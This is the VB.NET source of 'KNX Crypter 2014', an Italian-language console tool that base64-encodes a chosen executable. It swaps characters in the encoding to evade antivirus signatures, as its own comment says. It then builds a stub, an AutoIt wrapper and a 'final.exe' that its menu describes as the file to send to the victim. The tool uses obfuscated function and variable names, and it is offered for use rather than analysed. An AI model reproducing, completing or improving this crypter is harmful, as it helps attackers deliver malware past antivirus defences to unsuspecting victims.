Imports System.Text
Module Module1
    Public file As String

    Sub Main()
        capel()
        Console.WriteLine("Inserisci il file da cryptare")
        Console.WriteLine()
        file = Console.ReadLine
        If My.Computer.FileSystem.FileExists(file) = True Then
            Console.Clear()
            capel()
            mainconsole()
        Else
            Console.WriteLine("")
            Console.WriteLine("File non trovato!!!!")
            Console.ReadLine()
            Main()
        End If
    End Sub

    Private Sub capel()
        Console.Clear()
        Console.ForegroundColor = ConsoleColor.White
        Console.WriteLine("")
        Console.WriteLine("####################################################")
        Console.WriteLine("#                                                  #")
        Console.WriteLine("#         KNX Crypter 2014 ~ Full FUD 100%         #")
        Console.WriteLine("#                                                  #")
        Console.WriteLine("#                                                  #")
        Console.WriteLine("#            Coded by knx - Copyright              #")
        Console.WriteLine("#                                                  #")
        Console.WriteLine("####################################################")
        Console.WriteLine("")
        Console.WriteLine("")
    End Sub

    Private Sub mainconsole()
        Console.Write("File attualmente in uso: ")
        Console.ForegroundColor = ConsoleColor.Red
        Console.Write(file)
        Console.ForegroundColor = ConsoleColor.Green
        Console.WriteLine("")
        Console.WriteLine("")
        Console.WriteLine("Scegli un opzione valida oppure esci")
        Console.WriteLine("")
        Console.WriteLine("1. Genera Stub.exe. Questo file serve per leggere il file cryptato ed eseguirlo")
        Console.WriteLine("2. Genera STAB.KNX. Questo è il file cryptato")
        Console.WriteLine("3. Genera Final.au3. Questo file serve per fondere insieme i 2 file")
        Console.WriteLine("4. Genera final.exe. Questo è il risultato finale da spedire alla vittima")
        Console.WriteLine("")
        Console.WriteLine("5. Crypta un altro file")
        Console.WriteLine("")
        Console.WriteLine("6. Esci")
        Console.WriteLine("")
        Dim scelta As String = Console.ReadLine()
        Select Case scelta
            Case 1
                Call makestub()
                verificamake("Stub.exe")
                Console.ReadLine()
                Console.Clear()
                Call capel()
                Call mainconsole()
            Case 2
                Call makecrypt()
                verificamake("STAB.KNX")
                Console.ReadLine()
                Console.Clear()
                Call capel()
                Call mainconsole()
            Case 3
                Call makeautoit()
                verificamake("final.au3")
                Console.ReadLine()
                Console.Clear()
                Call capel()
                Call mainconsole()
            Case 4
                Call makeautoit()
                Call makecrypt()
                Call makestub()
                Call verificaautoit()
                verificamake("final.exe")
                Console.ReadLine()
                Console.Clear()
                Call capel()
                Call mainconsole()
            Case 5
                Call capel()
                Call Main()
            Case 6
                End
        End Select
    End Sub

    Private Sub verificamake(ByVal merda As String)
        Console.Clear()
        If My.Computer.FileSystem.FileExists(merda) Then
            Console.WriteLine("Generato " & merda)
        Else
            Console.WriteLine("Errore nella generazione del file")
        End If
    End Sub

    Private Sub verificaautoit()
        If My.Computer.FileSystem.FileExists("c:\program files (x86)\autoit3\aut2exe\aut2exe.exe") = True Then
            finisci("c:\program files (x86)\autoit3\aut2exe\aut2exe.exe")
        Else
            Console.WriteLine("Autoit Aut2Exe not found. Do u want manual specify path? [Y/n]")
            Dim s As String = Console.ReadLine()
            If s = "y" Then
                Console.WriteLine("PLease specify the Autoit Aut2exe fullpath")
                Dim f As String = Console.ReadLine()
                If f <> "" Then
                    finisci(f)
                End If
            Else
                Console.WriteLine("Path non valido")
            End If
        End If
    End Sub

    Private Sub makestub()

        Call stubili()

        Dim knx() As Byte = pMCKJTFsrj(Variabile22)

        IO.File.WriteAllBytes("STUB.EXE", knx)

    End Sub

    Private Sub makeautoit()

        Call autoit()

        FileOpen(5, "final.au3", OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)

        FilePut(5, programtext)

        FileClose(5)

    End Sub

    Private Sub pulisci()
        FileSystem.Kill("final.au3")
        FileSystem.Kill("STAB.KNX")
        FileSystem.Kill("Stub.exe")
    End Sub

    Private Sub makecrypt()

        '########### PRENDO IL FILE IN INPUT E LO CRYPTO NEL FILE STAB.KNX ###########
        Dim filesbytes As Byte() = IO.File.ReadAllBytes(file) ' Reads binary from file , gets its location from textbox1

        Dim lol As String = Convert.ToBase64String(filesbytes) 'Bytes get converted to base64 string 

        IO.File.WriteAllBytes("STAB.KNX", System.Text.Encoding.ASCII.GetBytes(lol.Replace("A", "#33FWQ@"))) 'Converts base64 string to bytes and replaces A's with $ since av's are detecting base64 strings and decodes them looking for signatures of malware

        '#############################################################################
    End Sub

    Private Sub finisci(ByVal path As String)
        Shell(path & " /in final.au3 /out Final.exe")
        pulisci()
    End Sub

    Function pMCKJTFsrj(ByVal gSVyrbkuvDFyu As String) As Byte()
        Dim yQhCOKvplEra
        Dim srWUsQeRIQ() As Byte
        gSVyrbkuvDFyu = Replace(gSVyrbkuvDFyu, " ", "")
        ReDim srWUsQeRIQ((Len(gSVyrbkuvDFyu) \ 2) - 1)
        For yQhCOKvplEra = 0 To UBound(srWUsQeRIQ) - 2
            srWUsQeRIQ(yQhCOKvplEra) = CLng("&H" & Mid$(gSVyrbkuvDFyu, 2 * yQhCOKvplEra + 1, 2))
        Next
        pMCKJTFsrj = srWUsQeRIQ
    End Function

End Module
